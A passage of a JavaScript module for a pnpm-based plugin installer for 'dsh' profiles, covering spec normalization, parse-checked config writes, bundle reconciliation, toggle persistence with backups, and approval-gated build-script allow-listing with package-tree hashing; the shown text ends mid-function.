// Installation backend: run `pnpm add <spec>` inside a profile directory,
// reconcile the profile's `dsh.profile.bundles` layer list, and auto-allow
// blocked build scripts (git-hosted plugins) exactly once.
//
// This mirrors what the official `dsh plugin --profile <name> add <spec>`
// command does (see @deepseek-ai/dsh/lib/plugin-*.js), reusing the public
// @deepseek-ai/dsh-app-boot APIs for profile resolution and initialization.

import { spawn, spawnSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync, rmSync, readdirSync, statSync, lstatSync, realpathSync, readlinkSync } from "node:fs";
import { basename, dirname, join, relative, resolve, isAbsolute, sep } from "node:path";
import { createRequire } from "node:module";
import { EventEmitter } from "node:events";
import { tmpdir } from "node:os";
import { createHash } from "node:crypto";
import { dump, load } from "js-yaml";
import { DEFAULT_PROFILE_BUNDLES, PROFILE_TEMPLATES, initProfile, resolveProfileDir } from "@deepseek-ai/dsh-app-boot";
import { describeBuildScripts, npmNameOf } from "./github.js";
import { commitPendingSnapshot, createProfileSnapshot, markPendingSnapshot, pnpmGuardEnv, pnpmSpawnPlan, rollbackPendingSnapshot } from "./guard.js";

// ── spec normalization ──────────────────────────────────────────────────────

/**
 * Normalize a user-supplied install spec into a pnpm-ready argument.
 * "owner/repo" and GitHub URLs become `github:owner/repo`; scoped npm names,
 * schemes, and absolute file/link paths pass through untouched.
 */
export function normalizeSpec(raw) {
  const spec = String(raw ?? "").trim();
  if (spec.length === 0) throw new Error("empty install spec: pass \"owner/repo\", a GitHub URL, an npm package name, or a tarball URL");
  if (spec.startsWith("@")) return spec; // scoped npm package like @scope/name[@ver]
  const githubUrl = /^https?:\/\/(?:www\.)?github\.com\/([^/\s]+\/[^/\s]+?)(?:\.git)?(?:\/.*)?$/i.exec(spec);
  if (githubUrl) return `github:${githubUrl[1]}`;
  if (/^(?:github:|git\+|git:|ssh:|npm:|file:|link:|https?:\/\/|\.{1,2}(?:[/\\]|$))/i.test(spec)) return spec;
  if (/^[^@/\s]+\/[^@/\s]+$/.test(spec)) return `github:${spec}`;
  return spec; // bare npm package name
}

// ── guarded config writes ───────────────────────────────────────────────────
//
// Installing someone else's plugin must never be able to leave a profile that
// dsh or pnpm refuses to load. Every write to a shared profile config goes
// through here: the new bytes are parsed back, and anything that does not
// parse is rolled back to the previous bytes before the error propagates. A
// bug in our own editing then costs a failed install, not a profile the user
// has to repair by hand.
//
// This is not hypothetical. Editing `allowBuilds` as a YAML sequence while
// pnpm had already written its own mapping stub produced a file no parser
// accepted, and every later pnpm operation in that profile — install,
// uninstall, update, any plugin at all — failed until the file was fixed
// manually.

/**
 * Write a config file only if the result still parses.
 * @param filePath - the file to write.
 * @param nextContent - the full new contents.
 * @param parse - throws when the content is not valid.
 * @param label - file name used in error messages.
 * @returns a rollback function restoring the pre-write bytes.
 */
function writeChecked(filePath, nextContent, parse, label) {
  const previous = existsSync(filePath) ? readFileSync(filePath, "utf8") : undefined;
  const rollback = () => {
    if (previous === undefined) rmSync(filePath, { force: true });
    else writeFileSync(filePath, previous);
  };
  writeFileSync(filePath, nextContent);
  try {
    parse(nextContent);
  } catch (error) {
    rollback();
    throw new Error(`${label} would not parse after the edit and was restored unchanged (${error.message}) — this is a bug in dsh-plugin-mall, please report it`);
  }
  return rollback;
}

/** writeChecked for YAML profile configs. */
function writeYamlChecked(filePath, nextContent, label) {
  return writeChecked(filePath, nextContent, (text) => load(text), label);
}

/** writeChecked for JSON profile configs. */
function writeJsonChecked(filePath, nextContent, label) {
  return writeChecked(filePath, nextContent, (text) => JSON.parse(text), label);
}

/**
 * writeChecked for cordis.patch.yml — the loader patch layer. Beyond parsing,
 * the contract is a top-level array; anything else and dsh fails to boot, so
 * that is checked here too rather than discovered at the next start.
 */
function writePatchChecked(filePath, nextContent) {
  return writeChecked(filePath, nextContent, (text) => {
    const doc = load(text);
    if (doc !== null && doc !== undefined && !Array.isArray(doc)) {
      throw new Error("expected a top-level array of patch entries");
    }
  }, "cordis.patch.yml");
}

// ── profile management ──────────────────────────────────────────────────────

/** Resolve and initialize (on first use) the target profile directory. */
export function ensureProfile(profile) {
  const dir = resolveProfileDir(profile); // throws on invalid names
  if (!existsSync(join(dir, "package.json"))) {
    initProfile(dir, PROFILE_TEMPLATES[profile] ?? DEFAULT_PROFILE_BUNDLES);
  }
  return dir;
}

/** Read the profile's package.json manifest. */
function readManifest(profileDir) {
  return JSON.parse(readFileSync(join(profileDir, "package.json"), "utf8"));
}

/** Locate an installed dependency's package.json under the profile tree. */
function packageJsonPathOf(packageName, profileDir) {
  const direct = join(profileDir, "node_modules", ...packageName.split("/"), "package.json");
  if (existsSync(direct)) return direct;
  try {
    return createRequire(join(profileDir, "noop.js")).resolve(`${packageName}/package.json`);
  } catch {
    return undefined;
  }
}

/** Whether an installed dependency declares `dsh.bundle.patch` (is a plugin bundle). */
function isBundlePackage(packageName, profileDir) {
  return classifyPackage(packageName, profileDir) === "bundle";
}

/**
 * Classify an installed package by its `dsh` declaration:
 * `bundle` (a profile patch layer), `client` (a browser-side UI plugin),
 * `plain` (a plain dependency), or `missing` (not resolvable).
 */
export function classifyPackage(packageName, profileDir) {
  const path = packageJsonPathOf(packageName, profileDir);
  if (path === undefined) return "missing";
  try {
    const manifest = JSON.parse(readFileSync(path, "utf8"));
    if (typeof manifest.dsh?.bundle?.patch === "string") return "bundle";
    if (manifest.dsh?.client !== undefined) return "client";
    return "plain";
  } catch {
    return "missing";
  }
}

/**
 * Reconcile `dsh.profile.bundles` against installed dependencies: a
 * dependency that declares a dsh bundle joins the layer stack (in dependency
 * order); an entry that was a dependency but no longer is one — removed, or
 * the installed version dropped its bundle declaration — leaves it. In-box
 * template bundles are not dependencies and are NEVER touched (mirroring the
 * official `dsh plugin` reconcile).
 * @param profileDir - the profile directory.
 * @param beforeDeps - dependency keys as they were before `pnpm add` ran.
 */
export function reconcileBundles(profileDir, beforeDeps = new Set()) {
  const manifestPath = join(profileDir, "package.json");
  const manifest = JSON.parse(readFileSync(manifestPath, "utf8"));
  const dependencies = new Set(Object.keys(manifest.dependencies ?? {}));
  const bundles = [...(manifest.dsh?.profile?.bundles ?? [])];
  const result = [];
  for (const bundleName of bundles) {
    const wasDependency = beforeDeps.has(bundleName) || dependencies.has(bundleName);
    const stillBundle = dependencies.has(bundleName) && isBundlePackage(bundleName, profileDir);
    // Keep template bundles and dependency-bundles; drop only entries that
    // were dependencies and stopped being bundles.
    if (!wasDependency || stillBundle) result.push(bundleName);
  }
  for (const dependencyName of dependencies) {
    if (!result.includes(dependencyName) && isBundlePackage(dependencyName, profileDir)) result.push(dependencyName);
  }
  if (JSON.stringify(result) !== JSON.stringify(bundles)) {
    manifest.dsh = {
      ...manifest.dsh,
      profile: {
        ...manifest.dsh?.profile,
        bundles: result,
      },
    };
    writeJsonChecked(manifestPath, JSON.stringify(manifest, undefined, 2) + "\n", "package.json");
  }
  return result;
}

/** List a profile's installed plugins (dependencies with classification + version). */
export function listInstalled(profile) {
  const dir = resolveProfileDir(profile);
  const manifestPath = join(dir, "package.json");
  if (!existsSync(manifestPath)) return { dir, deps: [] };
  const manifest = JSON.parse(readFileSync(manifestPath, "utf8"));
  const deps = Object.keys(manifest.dependencies ?? {}).map((name) => {
    const path = packageJsonPathOf(name, dir);
    let version = "?";
    let kind = "missing";
    if (path !== undefined) {
      try {
        const installed = JSON.parse(readFileSync(path, "utf8"));
        version = installed.version ?? "?";
        kind = classifyPackage(name, dir);
      } catch {
        /* keep defaults */
      }
    }
    return { name, version, kind };
  });
  return { dir, deps };
}

// ── npm registry resolution ─────────────────────────────────────────────────
//
// Registry lookups (anti-squatting, update checks, the host-shadow guard) have
// to hit the same registry pnpm installs from. Hardcoding npmjs while the user
// is on a mirror breaks all three silently — see the header comment in
// github.js. Resolution order mirrors pnpm's own: the profile's .npmrc, then
// `pnpm config get registry` (which folds in the user and global .npmrc
// chain), then npmjs. Cached per profile for the process lifetime; changing a
// registry needs a dsh restart anyway, like every other profile setting.

const DEFAULT_NPM_REGISTRY = "https://registry.npmjs.org";
const registryCache = new Map(); // profile -> Promise<string>

/** The `registry=` value from a profile-local .npmrc, if it sets one. */
function registryFromNpmrc(profileDir) {
  const npmrcPath = join(profileDir, ".npmrc");
  if (!existsSync(npmrcPath)) return undefined;
  try {
    for (const line of readFileSync(npmrcPath, "utf8").split("\n")) {
      const match = /^\s*registry\s*=\s*(\S+)\s*$/.exec(line);
      if (match !== null) return match[1];
    }
  } catch {
    /* unreadable .npmrc — fall through to pnpm */
  }
  return undefined;
}

/** `pnpm config get registry`, or undefined if pnpm is missing, slow, or unset. */
function registryFromPnpm() {
  return new Promise((resolve) => {
    let proc;
    try {
      proc = spawn("pnpm", ["config", "get", "registry"], {
        env: process.env,
        shell: process.platform === "win32",
        stdio: ["ignore", "pipe", "pipe"],
        windowsHide: true,
      });
    } catch {
      resolve(undefined);
      return;
    }
    let out = "";
    // 一次安装不该被一个探测子进程拖住：5s 没结果就当没有，走兜底。
    const timer = setTimeout(() => {
      proc.kill();
      resolve(undefined);
    }, 5000);
    proc.stdout?.on("data", (data) => { out += data.toString(); });
    proc.on("error", () => { clearTimeout(timer); resolve(undefined); });
    proc.on("close", (code) => {
      clearTimeout(timer);
      const value = out.trim();
      // pnpm prints "undefined" for an unset key — only take a real URL.
      resolve(code === 0 && /^https?:\/\//i.test(value) ? value : undefined);
    });
  });
}

/**
 * The registry pnpm installs from for this profile.
 * @param profile - profile name.
 * @returns a promise for the registry base URL, without a trailing slash.
 */
export function resolveRegistry(profile) {
  const key = String(profile ?? "");
  const cached = registryCache.get(key);
  if (cached !== undefined) return cached;
  const pending = (async () => {
    let dir;
    try {
      dir = resolveProfileDir(key);
    } catch {
      dir = undefined; // invalid profile name — the caller reports it, we just fall back
    }
    const fromNpmrc = dir === undefined ? undefined : registryFromNpmrc(dir);
    if (fromNpmrc !== undefined) return fromNpmrc.replace(/\/+$/, "");
    const fromPnpm = await registryFromPnpm();
    return (fromPnpm ?? DEFAULT_NPM_REGISTRY).replace(/\/+$/, "");
  })();
  registryCache.set(key, pending);
  return pending;
}

// ── client-plugin row registration ──────────────────────────────────────────

/** Profile patch file name (the user's own layer, applied after bundle layers). */
const PROFILE_PATCH_FILENAME = "cordis.patch.yml";

/** Derive a friendly row id from a package name: "@s/dsh-client-ui-aqua" -> "ui-aqua". */
function clientRowId(packageName) {
  const last = packageName.split("/").pop() ?? packageName;
  const trimmed = last.replace(/^dsh-/, "").replace(/^client-ui-/, "").replace(/^client-/, "");
  return trimmed.length > 0 ? trimmed : last;
}

/**
 * Idempotently register a `dsh.client` package as a loader row in the
 * profile's cordis.patch.yml (client packages are discovered from the loader
 * entry tree, so the dependency alone does not activate them).
 * A row whose `name` already exists (any id) is left untouched.
 * @returns {{ added: boolean, rowId?: string }}
 */
export function ensureClientRow(profileDir, packageName) {
  const patchPath = join(profileDir, PROFILE_PATCH_FILENAME);
  const content = existsSync(patchPath) ? readFileSync(patchPath, "utf8") : "[]\n";
  let parsed = null;
  try {
    parsed = load(content);
  } catch {
    /* a text-level name check still runs below */
  }
  const alreadyByName = (Array.isArray(parsed) && parsed.some((entry) =>
    Array.isArray(entry?.insert) && entry.insert.some((row) => row?.name === packageName)
  )) || new RegExp(`name:\\s*["']${packageName.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}["']`).test(content);
  if (alreadyByName) return { added: false };
  const rowId = clientRowId(packageName);
  const block = `- insert:\n    - id: ${rowId}\n      name: '${packageName}'\n`;
  const next = (Array.isArray(parsed) && parsed.length === 0)
    // The stock template is a comment plus `[]`; replace it wholesale.
    ? block
    : content.endsWith("\n") ? `${content}${block}` : `${content}\n${block}`;
  // 这个文件是 dsh 的装配补丁层：写坏了宿主直接起不来。
  writePatchChecked(patchPath, next);
  return { added: true, rowId };
}

/**
 * Remove the cordis.patch.yml loader row `ensureClientRow` registered for a
 * package. Textual and idempotent: only the exact block the register emitted
 * is spliced out, so user-authored rows survive byte-for-byte. An emptied
 * file falls back to the stock `[]` template.
 * @returns {{ removed: boolean, rowId?: string }}
 */
export function removeClientRow(profileDir, packageName) {
  const patchPath = join(profileDir, PROFILE_PATCH_FILENAME);
  if (!existsSync(patchPath)) return { removed: false };
  const content = readFileSync(patchPath, "utf8");
  const rowId = clientRowId(packageName);
  const lines = content.split("\n");
  let removed = false;
  for (let index = 0; index < lines.length - 2; index++) {
    if (lines[index] !== "- insert:") continue;
    if (lines[index + 1] !== `    - id: ${rowId}`) continue;
    if (lines[index + 2] !== `      name: '${packageName}'`) continue;
    lines.splice(index, 3);
    removed = true;
    break;
  }
  if (!removed) return { removed: false };
  const next = lines.join("\n").replace(/\n{3,}/g, "\n\n").trim();
  writePatchChecked(patchPath, next.length === 0 ? "[]\n" : `${next}\n`);
  return { removed: true, rowId };
}

// ── enable / disable persistence ────────────────────────────────────────────
//
// Toggling a plugin is three layers, and only the middle one lives here:
//   1. memory — `entry.update({disabled})` disposes/starts the fiber (index.js)
//   2. persistence — rewrite the profile's cordis.patch.yml, replayed
//      transactionally by dsh's own `watchUserPatches` (this file)
//   3. safety — back the file up before every edit so a bad write is undoable
//
// Persistence deliberately does NOT go through `loader.update()` even though
// that would write for us: its `tree.write()` targets `cordis.yml`, the
// composed artifact. A user's choice belongs in the patch layer they own, not
// baked into the thing composition regenerates. Same conclusion as
// cynch18/plugin-switch, which spells it out in its header comment.

/** A patch row's `disabled:` line, when it is a plain literal we may rewrite. */
const DISABLED_LINE_RE = /^(\s*)disabled\s*:\s*(.*?)\s*$/;

/**
 * Text-level edit of one entry's `disabled` in a patch file, preserving every
 * other byte (comments included — users hand-write this file).
 *
 * A profile's patch layer normally starts EMPTY (`[]`): plugins are mounted by
 * the bundle layers, not by the user's file. So "no row for this id" is the
 * common case, not an error — we append an id-targeted override row, which is
 * exactly what the patch layer is for (dsh-app-boot's applyEntryPatches treats
 * a non-insert row as "override these keys on the entry with this id", and
 * warns on a `name` mismatch, so we pass `name` as a guard).
 *
 * @param content - current cordis.patch.yml text.
 * @param entryId - the loader entry id whose row to edit.
 * @param disabled - desired state.
 * @param moduleName - the entry's module name, written alongside a NEW row so
 *   dsh can detect a stale patch if the id is ever reused.
 * @returns the new text, or undefined when it already reads that way.
 * @throws when the row's `disabled` is a `!!js` expression.
 */
export function setPatchRowDisabled(content, entryId, disabled, moduleName) {
  const lines = String(content ?? "").split("\n");
  // 行尾允许跟注释：`- id: at-file   # 我的备注` 是用户会写的形状。
  const idPattern = new RegExp(`^(\\s*)-?\\s*id\\s*:\\s*['"]?${entryId.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}['"]?\\s*(?:#.*)?$`);
  const rowIndex = lines.findIndex((line) => idPattern.test(line));
  if (rowIndex === -1) {
    // patch 层里还没有这一条——这是常态（profile 的 patch 层默认是空的 `[]`，
    // 插件由 bundle 层挂载）。追加一条 id 定向覆盖行。
    if (!disabled) return undefined; // 没有覆盖行 = 本来就是启用状态
    const block = moduleName === undefined
      ? `- id: ${entryId}\n  disabled: true\n`
      : `- id: ${entryId}\n  name: '${moduleName}'\n  disabled: true\n`;
    const trimmed = String(content ?? "").trim();
    // 模板是注释 + `[]`，整体替换掉那个空数组；否则在末尾追加。
    if (trimmed.endsWith("[]")) {
      return `${trimmed.slice(0, trimmed.lastIndexOf("[]")).trimEnd()}\n${block}`.replace(/^\n/, "");
    }
    return `${trimmed.length === 0 ? "" : `${trimmed}\n`}${block}`;
  }
  const indent = (idPattern.exec(lines[rowIndex])[1] ?? "").length;
  // 同一条目的后续行：缩进更深，或与 `- id:` 的内容对齐。遇到下一个条目/顶格即止。
  let existing = -1;
  for (let index = rowIndex + 1; index < lines.length; index++) {
    const line = lines[index];
    if (line.trim().length === 0) continue;
    const lead = line.length - line.trimStart().length;
    if (lead <= indent && /^\s*-\s/.test(line)) break; // 下一个条目
    if (lead < indent) break;                          // 退出该块
    const match = DISABLED_LINE_RE.exec(line);
    if (match !== null) { existing = index; break; }
  }
  if (existing !== -1) {
    const value = DISABLED_LINE_RE.exec(lines[existing])[2];
    // 用户写的是条件逻辑（如「只在 Windows 上停用」）。我们的开关只有两态，
    // 覆盖它等于把条件永久压成固定值，而且用户不会察觉——拒绝接管，让人手改。
    if (value.startsWith("!!js")) {
      throw new Error(`cannot toggle ${entryId}: its "disabled" is a !!js expression — edit cordis.patch.yml by hand`);
    }
    if ((value === "true") === disabled) return undefined; // 已是目标状态
    lines[existing] = lines[existing].replace(DISABLED_LINE_RE, `$1disabled: ${disabled}`);
    return lines.join("\n");
  }
  if (!disabled) return undefined; // 没有 disabled 行本就是启用状态
  // 插在 id 行之后，缩进与 id 的内容列对齐。
  lines.splice(rowIndex + 1, 0, `${" ".repeat(indent + 2)}disabled: true`);
  return lines.join("\n");
}

/** Keep the most recent N backups of a profile file, oldest pruned first. */
const PATCH_BACKUP_KEEP = 20;

/**
 * Snapshot cordis.patch.yml before editing it. The file is hand-editable and
 * carries the user's own rows; a bad automated write must be undoable without
 * reaching for git.
 * @returns the backup path, or undefined when there was nothing to back up.
 */
export function backupProfilePatch(profileDir) {
  const patchPath = join(profileDir, PROFILE_PATCH_FILENAME);
  if (!existsSync(patchPath)) return undefined;
  const dir = join(profileDir, "backups");
  mkdirSync(dir, { recursive: true });
  const stamp = new Date().toISOString().replace(/[:.]/g, "-");
  const target = join(dir, `cordis.patch.${stamp}.yml`);
  writeFileSync(target, readFileSync(patchPath, "utf8"));
  try {
    const kept = readdirSync(dir).filter((entry) => /^cordis\.patch\..*\.yml$/.test(entry)).sort();
    for (const stale of kept.slice(0, Math.max(0, kept.length - PATCH_BACKUP_KEEP))) {
      rmSync(join(dir, stale), { force: true });
    }
  } catch {
    /* 清理失败不该让切换失败 */
  }
  return target;
}

/**
 * Persist a toggle into the profile's patch layer: back up, edit, write through
 * the checked writer. dsh's own `watchUserPatches` replays the file
 * transactionally, so this is also what makes the change survive a restart.
 * @returns `{changed, backup?}`; `changed:false` means it already read that way.
 */
export function persistPluginDisabled(profileDir, entryId, disabled, moduleName) {
  const patchPath = join(profileDir, PROFILE_PATCH_FILENAME);
  const content = existsSync(patchPath) ? readFileSync(patchPath, "utf8") : "[]\n";
  const next = setPatchRowDisabled(content, entryId, disabled, moduleName);
  if (next === undefined) return { changed: false };
  const backup = backupProfilePatch(profileDir);
  writePatchChecked(patchPath, next);
  return { changed: true, backup };
}

// ── build-script allow-listing ──────────────────────────────────────────────

/** Extract package names from pnpm's "Ignored build scripts: ..." output. */
/** Valid npm package name (scoped or bare) — anything else is not a name. */
const NPM_NAME_RE = /^(@[a-z0-9-~][a-z0-9-._~]*\/)?[a-z0-9-~][a-z0-9-._~]*$/i;

/**
 * @returns `{name, version}` per blocked package. The version matters: the
 * disclosure has to show the scripts of the version that would actually run,
 * not whatever `latest` happens to be today.
 */
function parseIgnoredBuilds(output) {
  const found = new Map();
  // Only pnpm's own notice line is a parsing source. "allowBuilds" also
  // appears in pnpm's advice/error text (never followed by a name list), and
  // matching it fed error echoes into the allow-list, corrupting the YAML.
  const pattern = /(?:Ignored build scripts|onlyBuiltDependencies)\s*:\s*([^\n]+)/gi;
  let match;
  while ((match = pattern.exec(output)) !== null) {
    for (const raw of match[1].split(",")) {
      const candidate = raw.trim();
      if (candidate.length === 0) continue;
      // Split a trailing @version or @tarball-url so `foo@1.2.3` -> `foo` +
      // `1.2.3`, `@s/n@1.0.0` -> `@s/n` + `1.0.0`. Whatever remains must be a
      // valid npm name; pnpm error echoes ("9 | - pkg", advice sentences) are
      // dropped instead of being written to the YAML.
      const suffix = /@(?:([\w.+-]+)|https?:\/\/\S+|file:\S+|link:\S+|github:\S+)$/.exec(candidate);
      const name = suffix === null ? candidate : candidate.slice(0, suffix.index);
      // Keep pnpm's exact selector (for example
      // `fixture-native-pkg@file:../pkg`). `allowBuilds` matches that selector,
      // not always the bare package name. It is never accepted from a caller:
      // it comes only from pnpm's own single-line diagnostic and is rendered
      // back through js-yaml, after rejecting control characters.
      const selector = candidate;
      if (
        NPM_NAME_RE.test(name)
        && selector.length <= 512
        && !/[\u0000-\u001f\u007f]/.test(selector)
        && !found.has(selector)
      ) {
        found.set(selector, { name, version: suffix?.[1], selector });
      }
    }
  }
  return [...found.values()];
}

/**
 * Merge names into the profile's `pnpm-workspace.yaml` `allowBuilds`.
 *
 * pnpm accepts both shapes — a sequence (`- name`) and a mapping
 * (`name: true`) — but never both under one key, and pnpm writes a mapping
 * stub of its own (`name: set this to true or false`) when it blocks a build.
 * Appending a sequence item to that stub is what produced an unparseable file.
 * So: read the current shape through a real YAML parse, match it, and default
 * to pnpm's own mapping shape when there is nothing to match, which keeps our
 * edits and pnpm's from ever colliding again.
 *
 * A name already present as a mapping entry whose value is NOT `true` (pnpm's
 * undecided stub) is rewritten rather than skipped — treating the stub as
 * "already allowed" would leave the build still blocked on retry.
 *
 * Pure: takes the current file contents, returns the new contents (or
 * undefined when nothing needs changing). The fs half is ensureAllowBuilds.
 * Split out because this text surgery is the part that broke a profile, so it
 * is the part the fixtures at the bottom of this file have to pin.
 *
 * @param content - current pnpm-workspace.yaml contents.
 * @param names - package names to allow.
 * @returns the new contents, or undefined when already satisfied.
 * @throws when `content` does not parse as YAML.
 */
export function mergeAllowBuilds(content, names) {
  const valid = (Array.isArray(names) ? names : []).filter((name) => NPM_NAME_RE.test(name));
  if (valid.length === 0) return undefined;
  // A file that is already broken is not ours to edit — we could only make it
  // worse, and the user needs to see the real reason.
  let parsed;
  try {
    parsed = load(content);
  } catch (error) {
    throw new Error(`pnpm-workspace.yaml does not parse, refusing to edit it: ${error.message}`);
  }
  const current = parsed?.allowBuilds;
  const asSequence = Array.isArray(current);
  const asMapping = !asSequence && current !== null && typeof current === "object";
  const allowed = new Set(asSequence
    ? current.map((entry) => String(entry))
    : asMapping ? Object.entries(current).filter(([, value]) => value === true).map(([key]) => key) : []);
  // pnpm 的未决占位符（值不是 true）要改写，不能当成已放行跳过。
  const stubs = asMapping ? valid.filter((name) => name in current && current[name] !== true) : [];
  const additions = valid.filter((name) => !allowed.has(name) && !stubs.includes(name));
  if (additions.length === 0 && stubs.length === 0) return undefined;

  // Quote sequence entries: a bare `@scope/name` opens with YAML's reserved
  // `@` indicator. Mapping keys do not need it.
  const render = (name) => (asSequence ? `  - '${name}'` : `  ${name}: true`);
  const lines = content.split("\n");
  for (const name of stubs) {
    const pattern = new RegExp(`^(\\s*)(['"]?)${name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}\\2\\s*:.*$`);
    const index = lines.findIndex((line) => pattern.test(line));
    if (index !== -1) lines[index] = `  ${name}: true`;
  }
  let next;
  const keyIndex = lines.findIndex((line) => /^allowBuilds\s*:/.test(line));
  if (keyIndex === -1) {
    const base = lines.join("\n");
    next = `${base.endsWith("\n") ? base : `${base}\n`}\nallowBuilds:\n${additions.map(render).join("\n")}\n`;
  } else {
    if (/^allowBuilds\s*:\s*(\{\}|\[\])\s*$/.test(lines[keyIndex])) {
      lines[keyIndex] = "allowBuilds:";
    }
    // 块内 = 缩进行；空行不终止块；顶格行是下一个 key。
    let insertIndex = keyIndex + 1;
    for (let index = keyIndex + 1; index < lines.length; index++) {
      if (lines[index].trim().length === 0) continue;
      if (/^\s/.test(lines[index])) { insertIndex = index + 1; continue; }
      break;
    }
    if (additions.length > 0) lines.splice(insertIndex, 0, ...additions.map(render));
    next = lines.join("\n");
  }
  return next;
}

/**
 * Neutralize allowBuilds in pnpm-workspace.yaml so that all lifecycle scripts
 * are strictly blocked by pnpm on the initial install.
 * @param content - current pnpm-workspace.yaml contents.
 * @returns the neutralized workspace yaml.
 */
export function neutralizeWorkspaceContent(content) {
  const source = typeof content === "string" ? content : DEFAULT_WORKSPACE_YAML;
  let parsed;
  try {
    parsed = load(source);
  } catch (error) {
    throw new Error(`pnpm-workspace.yaml does not parse, refusing to run an install: ${error.message}`);
  }
  if (parsed === null || parsed === undefined) parsed = {};
  if (typeof parsed !== "object" || Array.isArray(parsed)) {
    throw new Error("pnpm-workspace.yaml root must be a mapping");
  }
  parsed.allowBuilds = {};
  parsed.onlyBuiltDependencies = [];
  parsed.dangerouslyAllowAllBuilds = false;
  return dump(parsed, { lineWidth: -1, noRefs: true, sortKeys: false });
}

/** Enable exactly the selectors pnpm itself reported while every broad build
 * policy switch stays disabled. The caller restores these temporary bytes as
 * soon as the rebuild process closes. */
export function enableApprovedBuildSelectors(content, selectors) {
  const parsed = load(neutralizeWorkspaceContent(content));
  const allowBuilds = {};
  for (const raw of Array.isArray(selectors) ? selectors : []) {
    const selector = String(raw ?? "");
    if (selector.length === 0 || selector.length > 512 || /[\u0000-\u001f\u007f]/.test(selector)) {
      throw new Error(`invalid pnpm build selector ${JSON.stringify(raw)}`);
    }
    allowBuilds[selector] = true;
  }
  if (Object.keys(allowBuilds).length === 0) throw new Error("no build selectors were approved");
  parsed.allowBuilds = allowBuilds;
  return dump(parsed, { lineWidth: -1, noRefs: true, sortKeys: false });
}

/** Legacy package.json policy may authorize scripts before the workspace gate
 * sees them. Refuse it: restoring the whole manifest after a successful add
 * would also erase the newly installed dependency. */
export function assertNoManifestBuildBypass(profileDir) {
  const manifest = JSON.parse(readFileSync(join(profileDir, "package.json"), "utf8"));
  const pnpm = manifest?.pnpm;
  if (pnpm && typeof pnpm === "object") {
    if (pnpm.dangerouslyAllowAllBuilds === true) throw new Error("package.json pnpm.dangerouslyAllowAllBuilds=true would bypass install-script approval");
    if (Array.isArray(pnpm.onlyBuiltDependencies) && pnpm.onlyBuiltDependencies.length > 0) throw new Error("package.json pnpm.onlyBuiltDependencies pre-authorizes install scripts");
    if (pnpm.allowBuilds && typeof pnpm.allowBuilds === "object" && Object.values(pnpm.allowBuilds).some((value) => value === true)) {
      throw new Error("package.json pnpm.allowBuilds pre-authorizes install scripts");
    }
  }
  const dependenciesMeta = manifest?.dependenciesMeta;
  if (dependenciesMeta && typeof dependenciesMeta === "object") {
    for (const [selector, metadata] of Object.entries(dependenciesMeta)) {
      if (metadata?.built === true) throw new Error(`package.json dependenciesMeta.${selector}.built=true would bypass install-script approval`);
    }
  }
}

/**
 * Deterministically hash the normalized package tree of a materialized package.
 * Computes SHA-256 over relative POSIX file paths and raw file bytes.
 * Rejects symlink escapes pointing outside the package directory.
 * @param pkgDir - absolute path to the materialized package directory.
 * @returns SHA-256 hex string.
 */
export function hashPackageTree(pkgDir) {
  if (typeof pkgDir !== "string" || !existsSync(pkgDir)) {
    throw new Error(`cannot hash package tree: directory ${JSON.stringify(pkgDir)} does not exist`);
  }
  const realRoot = realpathSync(pkgDir);
  const hash = createHash("sha256");
  const files = [];
  const visitedDirectories = new Set();

  function walk(currentDir) {
    const currentReal = realpathSync(currentDir);
    if (visitedDirectories.has(currentReal)) {
      throw new Error(`symlink cycle detected in package tree at ${currentDir}`);
    }
    visitedDirectories.add(currentReal);
    let entries;
    try {
      entries = readdirSync(currentDir, { withFileTypes: true });
    } catch (err) {
      throw new Error(`cannot read directory ${currentDir}: ${err.message}`);
    }
    entries.sort((a, b) => a.name.localeCompare(b.name));
    for (const entry of entries) {
      const entryName = entry.name;
      // npm excludes .git metadata from packed artifacts. Package-local
      // node_modules is NOT skipped: bundledDependencies are executable bytes
      // belonging to the artifact and must be covered by the approval proof.
      if (entryName === ".git") continue;

      const fullPath = join(currentDir, entryName);
      let lstat;
      try {
        lstat = lstatSync(fullPath);
      } catch (err) {
        throw new Error(`cannot stat ${fullPath}: ${err.message}`);
      }

      if (lstat.isSymbolicLink()) {
        let targetReal;
        try {
          targetReal = realpathSync(fullPath);
        } catch (err) {
          throw new Error(`unresolvable symlink ${fullPath}: ${err.message}`);
        }
        const rel = relative(realRoot, targetReal);
        if (rel === ".." || rel.startsWith(`..${sep}`) || isAbsolute(rel)) {
          throw new Error(`symlink escape detected in package tree: ${fullPath} points outside package root to ${targetReal}`);
        }
        let targetStat;
        try {
          targetStat = statSync(targetReal);
        } catch (err) {
          throw new Error(`cannot stat symlink target ${targetReal}: ${err.message}`);
        }
        const relPath = relative(realRoot, fullPath).replace(/\\/g, "/");
        const linkTarget = readlinkSync(fullPath).replace(/\\/g, "/");
        hash.update(`link:${relPath}\0${linkTarget}\0${lstat.mode & 0o777}\0`);
        if (targetStat.isDirectory()) {
          walk(fullPath);
        } else if (targetStat.isFile()) {
          files.push({ relPath, fullPath: targetReal, mode: targetStat.mode & 0o777 });
        }
      } else if (lstat.isDirectory()) {
        walk(fullPath);
      } else if (lstat.isFile()) {
        const relPath = relative(realRoot, fullPath).replace(/\\/g, "/");
        files.push({ relPath, fullPath, mode: lstat.mode & 0o777 });
      }
    }
    visitedDirectories.delete(currentReal);
  }

  walk(realRoot);
  files.sort((a, b) => a.relPath.localeCompare(b.relPath));

  for (const { relPath, fullPath, mode } of files) {
    let content;
    try {
      content = readFileSync(fullPath);
    } catch (err) {
      throw new Error(`cannot read file ${fullPath} during package hashing: ${err.message}`);
    }
    hash.update(`file:${relPath}\0${mode}\0${content.length}\0`);
    hash.update(content);
  }

  return hash.digest("hex");
}

/**
 * Locate a materialized package under <profileDir>/node_modules or .pnpm virtual store.
 * Strictly never falls back to ancestor node resolution.
 * @param profileDir - target profile directory.
 * @param pkgName - npm package name.
 * @param version - optional specific version.
 * @returns {{ dir: string, manifest: object }}
 */
export function findMaterializedPackage(profileDir, pkgName, version) {
  if (typeof pkgName !== "string" || !NPM_NAME_RE.test(pkgName)) {
    throw new Error(`invalid package name ${JSON.stringify(pkgName)} for materialized resolution`);
  }
  const modulesRoot = resolve(profileDir, "node_modules");

  // 1. Direct candidate path in profileDir/node_modules
  const direct = resolve(modulesRoot, ...pkgName.split("/"));
  const directManifestPath = join(direct, "package.json");
  if (existsSync(directManifestPath)) {
